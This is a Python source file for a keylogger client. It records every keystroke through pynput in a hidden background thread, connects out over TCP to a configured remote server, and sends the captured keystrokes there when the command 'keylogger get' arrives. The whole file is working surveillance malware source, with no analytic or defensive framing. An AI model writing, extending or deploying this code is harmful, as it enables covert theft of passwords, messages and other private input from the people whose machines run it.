import socket
import threading
import pynput.keyboard as keyboard
from lib import client, comm, config, string_utils

KEYLOG_BUFFER: str = ""


# --- KEYLOGGER FUNCTIONS ---
def on_press(key: keyboard.Key | keyboard.KeyCode | None):
    """Handles key presses and adds them to the buffer."""
    global KEYLOG_BUFFER

    if not key:
        return
    elif isinstance(key, keyboard.KeyCode):
        KEYLOG_BUFFER += str(key.char)
    else:
        # For special keys (Space, Enter, Shift, etc.)
        if key.name == "space":
            KEYLOG_BUFFER += " "
        elif key.name == "enter":
            KEYLOG_BUFFER += "[ENTER]\n"
        elif key.name == "backspace":
            KEYLOG_BUFFER += "[BACKSPACE]"
        else:
            KEYLOG_BUFFER += f"[{key.name.upper()}]"


def start_keylogger():
    """Starts the pynput listener in the background."""
    # This loop runs forever in the background thread
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


def init_keylogger(server: socket.socket):
    """Initializes and starts the keylogger in a separate thread."""
    global keylogger_thread
    # Start the keylogger in a separate thread
    try:
        keylogger_thread = threading.Thread(target=start_keylogger)
        # Allows the main program to exit even if the thread is running
        keylogger_thread.daemon = True
        keylogger_thread.start()
        comm.send(server, f"[+] Inititiated keylogger!...", config.CLIENT_VERBOSE)
    except Exception as e:
        comm.send(server, f"[-] Error: {e}", config.CLIENT_VERBOSE)


def shell(server: socket.socket):
    """Main loop for receiving and executing commands."""
    global KEYLOG_BUFFER
    while True:
        func, args = string_utils.extract_command(
            comm.receive(server, config.CLIENT_VERBOSE)
        )

        # quit
        if func == "quit":
            break
        # keylogger [start|get]
        elif func == "keylogger":
            if args[0] == "start":
                init_keylogger(server)
            elif args[0] == "get":
                comm.send(
                    server,
                    f"\n[--- KEYLOGS ---\n{KEYLOG_BUFFER}\n--- END ---]",
                    config.CLIENT_VERBOSE,
                )
                KEYLOG_BUFFER = ""


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect_server(sock, (config.IP, config.KLG_PORT), shell, 5)
